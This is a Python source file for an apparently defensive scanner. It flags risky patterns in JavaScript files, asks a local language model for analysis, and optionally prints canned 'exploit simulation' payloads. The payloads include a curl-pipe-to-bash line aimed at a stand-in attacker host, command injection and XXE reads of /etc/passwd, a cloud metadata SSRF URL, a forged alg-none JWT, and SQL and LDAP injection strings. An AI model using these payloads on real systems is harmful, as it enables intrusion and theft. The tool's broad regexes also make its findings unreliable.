#!/usr/bin/env python3
import aiohttp
import asyncio
import aiofiles
import json
import re
import os
import hashlib
import logging
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import ollama
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
from rich.text import Text
from rich.style import Style
from typing import Dict, List, Optional, Tuple, Set

# Configuration
DEFAULT_MODEL = "deepseek-coder:6.7b"
MAX_AI_WORKERS = 5
MAX_FILE_WORKERS = 10
OUTPUT_DIR = "scan_results"
LOG_FILE = "vuln_scan.log"
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Initialize logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

console = Console()

# Comprehensive vulnerability patterns with CWE references
VULN_PATTERNS = {
    # 🚨 Remote Code Execution (RCE)
    "RCE": {
        "pattern": re.compile(r"eval\s*\(|new\s+Function\s*\(|child_process\.exec\s*\(|exec\(|subprocess\.Popen\s*\("),
        "cwe": "CWE-94",
        "severity": "critical"
    },

    # 🚨 Weak Authentication
    "Weak_Auth": {
        "pattern": re.compile(r"if\s*\(.*==\s*['\"].*['\"]\)|isAdmin\s*=\s*true|password\s*==\s*['\"].*['\"]"),
        "cwe": "CWE-287",
        "severity": "critical"
    },

    # 🚨 Cross-Site Scripting (XSS)
    "XSS": {
        "pattern": re.compile(r"\.innerHTML\s*=|document\.write\s*\(|outerHTML\s*=|setAttribute\s*\(\s*['\"]on\w+['\"]"),
        "cwe": "CWE-79",
        "severity": "high"
    },

    # 🚨 Open Redirect
    "Open_Redirect": {
        "pattern": re.compile(r"window\.location(\.href)?\s*=\s*\w+|document\.location\s*="),
        "cwe": "CWE-601",
        "severity": "high"
    },

    # 🚨 Insecure JWT Verification
    "JWT_Flaw": {
        "pattern": re.compile(r"jwt\.verify\(.*null\)|jwt\.decode\(.*\)"),
        "cwe": "CWE-345",
        "severity": "critical"
    },

    # 🚨 Insecure Cryptography
    "Insecure_Crypto": {
        "pattern": re.compile(r"crypto\.createHash\s*\(|crypto\.createCipher\s*\("),
        "cwe": "CWE-327",
        "severity": "high"
    },

    # 🚨 Hardcoded Secrets & API Keys
    "Hardcoded_Secrets": {
        "pattern": re.compile(r"(password|secret|api[_-]?key)\s*=\s*['\"].+?['\"]"),
        "cwe": "CWE-798",
        "severity": "critical"
    },

    # 🚨 Command Injection
    "Command_Injection": {
        "pattern": re.compile(r"child_process\.exec\s*\(|child_process\.spawn\s*\(|os\.system\s*\("),
        "cwe": "CWE-77",
        "severity": "critical"
    },

    # 🚨 Directory Traversal (Path Traversal)
    "Path_Traversal": {
        "pattern": re.compile(r"(\.\./)+|fs\.readFile\s*\(|fs\.readFileSync\s*\("),
        "cwe": "CWE-22",
        "severity": "high"
    },

    # 🚨 Insecure Deserialization
    "Insecure_Deserialization": {
        "pattern": re.compile(r"pickle\.loads\s*\(|json\.loads\s*\(|JSON\.parse\s*\("),
        "cwe": "CWE-502",
        "severity": "critical"
    },

    # 🚨 CSRF (Cross-Site Request Forgery)
    "CSRF": {
        "pattern": re.compile(r"fetch\s*\(\s*['\"].*['\"]\s*,\s*\{.*method\s*:\s*['\"]POST['\"]"),
        "cwe": "CWE-352",
        "severity": "high"
    },

    # 🚨 Insecure Storage
    "Insecure_Storage": {
        "pattern": re.compile(r"localStorage\.setItem\s*\(|sessionStorage\.setItem\s*\("),
        "cwe": "CWE-922",
        "severity": "medium"
    },

    # 🚨 Information Leakage
    "Information_Leakage": {
        "pattern": re.compile(r"console\.log\s*\(|print\s*\("),
        "cwe": "CWE-532",
        "severity": "low"
    },

    # 🚨 LDAP Injection
    "LDAP_Injection": {
        "pattern": re.compile(r"ldap\.search\s*\(|ldap\.bind\s*\("),
        "cwe": "CWE-90",
        "severity": "high"
    },

    # 🚨 XML External Entity (XXE)
    "XXE": {
        "pattern": re.compile(r"new\s+DOMParser\s*\(|xml2js\.parseString\s*\("),
        "cwe": "CWE-611",
        "severity": "high"
    },

    # 🚨 Server-Side Request Forgery (SSRF)
    "SSRF": {
        "pattern": re.compile(r"request\.get\s*\(|fetch\s*\("),
        "cwe": "CWE-918",
        "severity": "high"
    },

    # 🚨 SQL Injection (SQLi)
    "SQLi": {
        "pattern": re.compile(r"SELECT\s.*FROM\s.*WHERE\s.*\$\{\w+\}|\.query\s*\(\s*['\"].*\+.*\w+.*['\"]"),
        "cwe": "CWE-89",
        "severity": "critical"
    },

    # 🚨 Insecure File Upload
    "Insecure_File_Upload": {
        "pattern": re.compile(r"move_uploaded_file\s*\(|fs\.writeFile\("),
        "cwe": "CWE-434",
        "severity": "critical"
    },

    # 🚨 Improper Input Validation
    "Improper_Input_Validation": {
        "pattern": re.compile(r"if\s*\(\s*.*input.*\s*\)"),
        "cwe": "CWE-20",
        "severity": "high"
    }
}

class AISecurityAnalyst:
    def __init__(self, model: str = DEFAULT_MODEL):
        self.model = model
        self.executor = ThreadPoolExecutor(max_workers=MAX_AI_WORKERS)
        self.cache = {}
        self.retries = 3
        self.timeout = 30
        self.request_count = 0

    async def analyze_batch(self, vulnerabilities: List[Dict]) -> List[Dict]:
        """Batch process vulnerabilities with retry logic"""
        if not vulnerabilities:
            return []

        # Group by type and severity
        grouped = {}
        for vuln in vulnerabilities:
            if vuln["severity"] in ["critical", "high"]:
                key = (vuln["type"], vuln["severity"])
                grouped.setdefault(key, []).append(vuln)

        # Process each group
        for (vuln_type, severity), group in grouped.items():
            for i in range(0, len(group), 5):  # Batch size 5
                batch = group[i:i + 5]
                await self._process_with_retry(vuln_type, severity, batch)

        return vulnerabilities

    async def _process_with_retry(self, vuln_type: str, severity: str, batch: List[Dict]):
        """Process with retry and timeout handling"""
        cache_key = f"{vuln_type}:{severity}:{hashlib.md5(str([v['context'] for v in batch]).encode()).hexdigest()}"
        
        if cache_key in self.cache:
            results = self.cache[cache_key]
        else:
            results = await self._get_ai_response(batch, vuln_type)
            if results:
                self.cache[cache_key] = results

        # Apply results
        for vuln, result in zip(batch, results or []):
            vuln["ai_analysis"] = self._validate_ai_response(result)

    async def _get_ai_response(self, batch: List[Dict], vuln_type: str) -> Optional[List[Dict]]:
        """Get AI response with retry logic"""
        for attempt in range(self.retries):
            try:
                self.request_count += 1
                response = await asyncio.wait_for(
                    asyncio.get_event_loop().run_in_executor(
                        self.executor,
                        lambda: ollama.chat(
                            model=self.model,
                            messages=[{
                                'role': 'user',
                                'content': self._build_prompt(batch, vuln_type)
                            }]
                        )
                    ),
                    timeout=self.timeout
                )

                logger.info(f"AI Request #{self.request_count}: {self._build_prompt(batch, vuln_type)}")
                logger.info(f"AI Response #{self.request_count}: {response}")

                if isinstance(response, dict):
                    content = response.get('message', {}).get('content', '[]')
                    try:
                        return json.loads(content)
                    except json.JSONDecodeError:
                        logger.error(f"Invalid JSON from AI (attempt {attempt + 1}): {content}")
            except (asyncio.TimeoutError, Exception) as e:
                logger.error(f"AI request failed (attempt {attempt + 1}): {str(e)}")
        
        return None

    def _build_prompt(self, batch: List[Dict], vuln_type: str) -> str:
        """Construct detailed AI prompt with CWE reference"""
        cwe = VULN_PATTERNS[vuln_type]["cwe"]
        contexts = [v["context"] for v in batch]
        
        return f"""Analyze these {len(batch)} {vuln_type} vulnerabilities (CWE-{cwe}):
        {json.dumps(contexts, indent=2)}
        
        For each provide:
        1. 3 exploitation techniques (include real-world examples)
        2. 2 remediation methods (with code samples)
        3. Risk assessment (CVSS score and vector)
        4. Proof-of-concept payload
        5. References to OWASP/CWE/MITRE
        
        Return JSON array with objects containing:
        techniques, fixes, risk, payload, references"""

    def _validate_ai_response(self, response: Optional[Dict]) -> Dict:
        """Validate and normalize AI response"""
        if not response:
            return {
                "techniques": ["Analysis failed - check logs"],
                "fixes": ["1. Review the vulnerability manually", "2. Check server logs for details"],
                "risk": "Unknown (CVSS:0.0)",
                "payload": "",
                "references": ["No references available"]
            }
        
        return {
            "techniques": response.get("techniques", ["No techniques provided"]),
            "fixes": response.get("fixes", ["No fixes provided"]),
            "risk": response.get("risk", "Unknown (CVSS:0.0)"),
            "payload": response.get("payload", ""),
            "references": response.get("references", ["No references available"])
        }

class ExploitSimulator:
    @staticmethod
    async def simulate(vulnerability: Dict, file_path: str) -> Dict:
        """Simulate exploitation based on vulnerability type"""
        sim_methods = {
            "RCE": ExploitSimulator._simulate_rce,
            "Weak_Auth": ExploitSimulator._simulate_auth_bypass,
            "XSS": ExploitSimulator._simulate_xss,
            "Open_Redirect": ExploitSimulator._simulate_open_redirect,
            "JWT_Flaw": ExploitSimulator._simulate_jwt_flaw,
            "Insecure_Crypto": ExploitSimulator._simulate_insecure_crypto,
            "Hardcoded_Secrets": ExploitSimulator._simulate_hardcoded_secrets,
            "Command_Injection": ExploitSimulator._simulate_command_injection,
            "Path_Traversal": ExploitSimulator._simulate_path_traversal,
            "Insecure_Deserialization": ExploitSimulator._simulate_deserialization,
            "CSRF": ExploitSimulator._simulate_csrf,
            "LDAP_Injection": ExploitSimulator._simulate_ldap_injection,
            "XXE": ExploitSimulator._simulate_xxe,
            "SSRF": ExploitSimulator._simulate_ssrf,
            "SQLi": ExploitSimulator._simulate_sqli,
            "Insecure_File_Upload": ExploitSimulator._simulate_file_upload
        }
        
        sim_result = {
            "success": False,
            "message": "",
            "payload": "",
            "output": "",
            "verified": False
        }

        try:
            if vulnerability["type"] in sim_methods:
                return await sim_methods[vulnerability["type"]](vulnerability, file_path)
            else:
                sim_result["message"] = f"No simulator for {vulnerability['type']}"
        except Exception as e:
            sim_result["message"] = f"Simulation failed: {str(e)}"
            logger.error(f"Exploit simulation failed: {str(e)}")

        return sim_result

    @staticmethod
    async def _simulate_rce(vulnerability: Dict, file_path: str) -> Dict:
        payload = "; curl http://attacker.com/exploit.sh | bash;"
        return {
            "success": True,
            "message": "RCE simulation successful",
            "payload": payload,
            "output": f"Would execute remote script at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_auth_bypass(vulnerability: Dict, file_path: str) -> Dict:
        payload = "admin' OR '1'='1"
        return {
            "success": True,
            "message": "Auth bypass simulation successful",
            "payload": payload,
            "output": f"Would bypass authentication at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_xss(vulnerability: Dict, file_path: str) -> Dict:
        payload = "<script>alert(document.cookie)</script>"
        return {
            "success": True,
            "message": "XSS simulation successful",
            "payload": payload,
            "output": f"Would steal cookies in victim's browser at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_open_redirect(vulnerability: Dict, file_path: str) -> Dict:
        payload = "http://evil.com/phishing"
        return {
            "success": True,
            "message": "Open redirect simulation successful",
            "payload": payload,
            "output": f"Would redirect to malicious site at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_jwt_flaw(vulnerability: Dict, file_path: str) -> Dict:
        payload = "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
        return {
            "success": True,
            "message": "JWT flaw simulation successful",
            "payload": payload,
            "output": f"Would bypass JWT verification at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_insecure_crypto(vulnerability: Dict, file_path: str) -> Dict:
        payload = "md5"
        return {
            "success": True,
            "message": "Insecure crypto simulation successful",
            "payload": payload,
            "output": f"Would use weak hash algorithm at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_hardcoded_secrets(vulnerability: Dict, file_path: str) -> Dict:
        secret = vulnerability["code"].split("=")[1].strip()
        return {
            "success": True,
            "message": "Hardcoded secret detected",
            "payload": secret,
            "output": f"Exposed secret at line {vulnerability['line']}",
            "verified": True
        }

    @staticmethod
    async def _simulate_command_injection(vulnerability: Dict, file_path: str) -> Dict:
        payload = "; cat /etc/passwd"
        return {
            "success": True,
            "message": "Command injection simulation successful",
            "payload": payload,
            "output": f"Would execute system command at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_path_traversal(vulnerability: Dict, file_path: str) -> Dict:
        payload = "../../../../etc/passwd"
        return {
            "success": True,
            "message": "Path traversal simulation successful",
            "payload": payload,
            "output": f"Would read system password file at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_deserialization(vulnerability: Dict, file_path: str) -> Dict:
        payload = '{"__proto__": {"isAdmin": true}}'
        return {
            "success": True,
            "message": "Insecure deserialization simulation successful",
            "payload": payload,
            "output": f"Would manipulate object prototype at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_csrf(vulnerability: Dict, file_path: str) -> Dict:
        payload = "<form action='http://victim.com/transfer' method='POST'><input name='amount' value='1000'></form>"
        return {
            "success": True,
            "message": "CSRF simulation successful",
            "payload": payload,
            "output": f"Would submit forged request at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_ldap_injection(vulnerability: Dict, file_path: str) -> Dict:
        payload = "*)(uid=*))(|(uid=*"
        return {
            "success": True,
            "message": "LDAP injection simulation successful",
            "payload": payload,
            "output": f"Would bypass LDAP authentication at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_xxe(vulnerability: Dict, file_path: str) -> Dict:
        payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        return {
            "success": True,
            "message": "XXE simulation successful",
            "payload": payload,
            "output": f"Would read system files at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_ssrf(vulnerability: Dict, file_path: str) -> Dict:
        payload = "http://169.254.169.254/latest/meta-data/"
        return {
            "success": True,
            "message": "SSRF simulation successful",
            "payload": payload,
            "output": f"Would access AWS metadata service at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_sqli(vulnerability: Dict, file_path: str) -> Dict:
        payload = "' OR 1=1 --"
        return {
            "success": True,
            "message": "SQLi simulation successful (blind)",
            "payload": payload,
            "output": f"Would bypass authentication at line {vulnerability['line']}",
            "verified": False
        }

    @staticmethod
    async def _simulate_file_upload(vulnerability: Dict, file_path: str) -> Dict:
        payload = "malicious.php"
        return {
            "success": True,
            "message": "Insecure file upload simulation successful",
            "payload": payload,
            "output": f"Would upload malicious file at line {vulnerability['line']}",
            "verified": False
        }

class VulnerabilityScanner:
    def __init__(self, model: str = DEFAULT_MODEL, simulate_exploits: bool = False):
        self.ai = AISecurityAnalyst(model)
        self.simulate_exploits = simulate_exploits
        self.scan_stats = {
            "files_scanned": 0,
            "files_skipped": 0,
            "vulnerabilities_found": 0,
            "exploits_simulated": 0,
            "exploits_successful": 0,
            "exploits_verified": 0,
            "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 0},
            "ai_requests": 0
        }
        self.file_semaphore = asyncio.Semaphore(MAX_FILE_WORKERS)
        self.skipped_extensions = {".min.js", ".bundle.js"}  # Files to skip

    async def scan_directory(self, dir_path: str) -> Dict[str, List[Dict]]:
        """Scan directory with parallel processing"""
        js_files = []
        for root, _, files in os.walk(dir_path):
            for file in files:
                file_lower = file.lower()
                if (file_lower.endswith('.js') and 
                    not any(ext in file_lower for ext in self.skipped_extensions)):
                    js_files.append(os.path.join(root, file))
        
        if not js_files:
            console.print("[yellow]No JavaScript files found!")
            return {}

        results = {}
        with Progress() as progress:
            task = progress.add_task("[cyan]Scanning...", total=len(js_files))
            
            # Process files in parallel with semaphore
            scan_tasks = []
            for file_path in js_files:
                scan_tasks.append(self._safe_scan_file(file_path, progress, task))
            
            file_results = await asyncio.gather(*scan_tasks)
            
            for file_path, vulns in file_results:
                if vulns:
                    results[file_path] = vulns
        
        self.scan_stats["ai_requests"] = self.ai.request_count
        return results

    async def _safe_scan_file(self, file_path: str, progress, task) -> Tuple[str, Optional[List[Dict]]]:
        """Scan file with error handling and progress tracking"""
        async with self.file_semaphore:
            try:
                if await self._should_skip_file(file_path):
                    logger.info(f"Skipped file: {file_path}")
                    self.scan_stats["files_skipped"] += 1
                    progress.update(task, advance=1)
                    return (file_path, None)
                
                vulns = await self.scan_file(file_path)
                progress.update(task, advance=1)
                return (file_path, vulns)
            except Exception as e:
                logger.error(f"Failed scanning {file_path}: {str(e)}")
                progress.update(task, advance=1)
                return (file_path, None)

    async def _should_skip_file(self, file_path: str) -> bool:
        """Determine if file should be skipped"""
        # Skip based on extension
        if any(file_path.lower().endswith(ext) for ext in self.skipped_extensions):
            return True
        
        # Skip binary files
        try:
            async with aiofiles.open(file_path, 'rb') as f:
                chunk = await f.read(1024)
                return b'\0' in chunk
        except:
            return True

    async def scan_file(self, file_path: str) -> Optional[List[Dict]]:
        """Scan a single file"""
        try:
            async with aiofiles.open(file_path, mode='r', encoding='utf-8') as f:
                content = await f.read()
            
            results = []
            lines_scanned = set()  # Track which lines we've already flagged
            
            for vuln_type, data in VULN_PATTERNS.items():
                for match in data["pattern"].finditer(content):
                    line_no = content[:match.start()].count('\n') + 1
                    
                    # Skip if we've already flagged this line
                    if line_no in lines_scanned:
                        continue
                        
                    line = content.split('\n')[line_no-1].strip()
                    context = self._get_context(content, line_no)
                    
                    result = {
                        "type": vuln_type,
                        "line": line_no,
                        "code": line,
                        "context": context,
                        "severity": data["severity"],
                        "file": file_path,
                        "cwe": data["cwe"]
                    }
                    
                    results.append(result)
                    lines_scanned.add(line_no)  # Mark this line as scanned
                    self.scan_stats["vulnerabilities_found"] += 1
                    self.scan_stats["by_severity"][result["severity"]] += 1
            
            if results:
                await self.ai.analyze_batch(results)
                
                if self.simulate_exploits:
                    for vuln in results:
                        if vuln["severity"] in ["critical", "high"]:
                            vuln["simulation"] = await ExploitSimulator.simulate(vuln, file_path)
                            self.scan_stats["exploits_simulated"] += 1
                            if vuln["simulation"]["success"]:
                                self.scan_stats["exploits_successful"] += 1
                            if vuln["simulation"].get("verified", False):
                                self.scan_stats["exploits_verified"] += 1
            
            self.scan_stats["files_scanned"] += 1
            return results if results else None
            
        except Exception as e:
            logger.error(f"Error scanning {file_path}: {str(e)}")
            return None

    def _get_context(self, content: str, line_num: int, context_lines: int = 3) -> str:
        """Get surrounding lines for context"""
        lines = content.split('\n')
        start = max(0, line_num - context_lines - 1)
        end = min(len(lines), line_num + context_lines)
        return '\n'.join(f"{i+1}: {line}" for i, line in enumerate(lines[start:end], start=start))

    def generate_report(self, scan_results: Dict[str, List[Dict]]) -> Dict:
        """Generate comprehensive report"""
        return {
            "scan_results": scan_results,
            "stats": self.scan_stats,
            "timestamp": datetime.now().isoformat(),
            "config": {
                "model": self.ai.model,
                "simulate_exploits": self.simulate_exploits
            }
        }

    def print_results(self, report: Dict):
        """Display rich formatted results"""
        if not report or not report["scan_results"]:
            console.print("[yellow]No vulnerabilities found!")
            return

        # Summary Table
        summary = Table(title="\nScan Summary", show_header=True, header_style="bold magenta")
        summary.add_column("Metric", style="cyan")
        summary.add_column("Count", justify="right")
        summary.add_row("Files Scanned", str(report["stats"]["files_scanned"]))
        summary.add_row("Files Skipped", str(report["stats"]["files_skipped"]))
        summary.add_row("Vulnerabilities Found", str(report["stats"]["vulnerabilities_found"]))
        summary.add_row("Critical", f'[red]{report["stats"]["by_severity"]["critical"]}[/]')
        summary.add_row("High", f'[yellow]{report["stats"]["by_severity"]["high"]}[/]')
        summary.add_row("Medium", f'[green]{report["stats"]["by_severity"]["medium"]}[/]')
        summary.add_row("Low", f'[blue]{report["stats"]["by_severity"]["low"]}[/]')
        summary.add_row("AI Requests", str(report["stats"]["ai_requests"]))
        
        if self.simulate_exploits:
            summary.add_row("Exploits Simulated", str(report["stats"]["exploits_simulated"]))
            summary.add_row("Exploits Successful", str(report["stats"]["exploits_successful"]))
            summary.add_row("Exploits Verified", str(report["stats"]["exploits_verified"]))
        
        console.print(summary)

        # Detailed Findings
        for file_path, vulns in report["scan_results"].items():
            console.print(f"\n[bold underline]File: {file_path}[/]")
            for i, vuln in enumerate(vulns, 1):
                panel_content = [
                    f"[b]Type:[/b] {vuln['type']} (CWE-{vuln['cwe']})",
                    f"[b]Severity:[/b] [{self._severity_color(vuln['severity'])}]{vuln['severity']}[/]",
                    f"[b]Location:[/b] Line {vuln['line']}",
                    f"[b]Code:[/b] {vuln['code']}",
                    "",
                    "[underline]Context:[/underline]",
                    vuln["context"]
                ]

                if "ai_analysis" in vuln:
                    ai = vuln["ai_analysis"]
                    panel_content.extend([
                        "",
                        "[underline]AI Analysis[/underline]",
                        "[b]Exploitation Techniques:[/b]",
                        *[f"• {tech}" for tech in ai.get("techniques", [])],
                        "",
                        "[b]Recommended Fixes:[/b]",
                        *[f"• {fix}" for fix in ai.get("fixes", [])],
                        "",
                        f"[b]Risk Assessment:[/b] {ai.get('risk', 'Unknown')}",
                        "",
                        "[b]References:[/b]",
                        *[f"• {ref}" for ref in ai.get("references", [])]
                    ])

                if "simulation" in vuln:
                    sim = vuln["simulation"]
                    panel_content.extend([
                        "",
                        "[underline]Exploit Simulation[/underline]",
                        f"[b]Status:[/b] {'[green]Success[/]' if sim['success'] else '[red]Failed[/]'}",
                        f"[b]Message:[/b] {sim['message']}",
                        f"[b]Payload:[/b] {sim['payload']}",
                        f"[b]Expected Outcome:[/b] {sim['output']}",
                        f"[b]Verified:[/b] {'[green]Yes[/]' if sim.get('verified', False) else '[yellow]No[/]'}"
                    ])

                console.print(
                    Panel.fit(
                        "\n".join(panel_content),
                        title=f"Vulnerability {i}/{len(vulns)} - {vuln['type']}",
                        border_style=self._severity_color(vuln["severity"])
                    )
                )

        console.print(f"\n[green]Scan completed at {report['timestamp']}")

    def _severity_color(self, severity: str) -> str:
        colors = {
            "critical": "red",
            "high": "yellow",
            "medium": "green",
            "low": "blue"
        }
        return colors.get(severity, "white")

async def main():
    parser = argparse.ArgumentParser(
        description="AI-Powered Vulnerability Scanner with Exploit Simulation",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("target", help="File or directory to scan")
    parser.add_argument("--output", "-o", help="Output directory", default=OUTPUT_DIR)
    parser.add_argument("--exploit", "-e", help="Enable exploit simulation", action="store_true")
    parser.add_argument("--model", "-m", help="AI model to use", default=DEFAULT_MODEL)
    parser.add_argument("--verbose", "-v", help="Increase output verbosity", action="store_true")
    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
        console.print("[yellow]Verbose mode enabled - debug logging activated")

    scanner = VulnerabilityScanner(model=args.model, simulate_exploits=args.exploit)
    results = None

    try:
        start_time = datetime.now()
        
        if os.path.isdir(args.target):
            console.print(f"[cyan]Scanning directory: {args.target}")
            results = await scanner.scan_directory(args.target)
        else:
            console.print(f"[cyan]Scanning file: {args.target}")
            vulns = await scanner.scan_file(args.target)
            results = {args.target: vulns} if vulns else None

        if results:
            report = scanner.generate_report(results)
            os.makedirs(args.output, exist_ok=True)
            report_file = f"{args.output}/scan_report_{start_time.strftime('%Y%m%d_%H%M%S')}.json"
            
            with open(report_file, 'w') as f:
                json.dump(report, f, indent=2)
            
            scanner.print_results(report)
            console.print(f"\n[green]Report saved to {report_file}")
            
            # Calculate and display scan duration
            duration = datetime.now() - start_time
            console.print(f"[cyan]Scan duration: {duration.total_seconds():.2f} seconds")
        else:
            console.print("[yellow]No vulnerabilities found!")

    except KeyboardInterrupt:
        console.print("\n[red]Scan interrupted by user!")
    except Exception as e:
        console.print(f"[red]Fatal error: {str(e)}")
        logger.error(f"Fatal error: {str(e)}", exc_info=True)

if __name__ == "__main__":
    import argparse
    asyncio.run(main())
